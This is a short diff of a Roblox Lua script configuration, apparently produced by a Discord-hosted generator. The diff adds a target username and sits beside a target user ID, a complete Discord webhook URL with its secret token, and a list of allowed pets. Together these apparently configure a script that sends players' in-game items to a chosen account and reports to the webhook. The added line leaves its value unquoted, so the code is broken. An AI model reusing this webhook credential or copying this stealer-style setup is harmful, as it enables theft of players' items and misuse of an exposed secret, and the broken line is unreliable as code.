@@ -1,5 +1,5 @@
 -- This file was generated at discord.gg/syncrypt
-
+getgenv().TARGET_USERN = lolmujee
 getgenv().TARGET_USER_ID = 10180846954
 getgenv().GOOD_WEBHOOK = "https://discord.com/api/webhooks/1554509240406904932/xmoVjD4nejjUIfUi0EXYKC7GDvMAspm8WWqIKd8B4GLCgtmzHiBbZm6IVwtBdEiFSH9k"
 getgenv().ALLOWED_ANIMALS = {
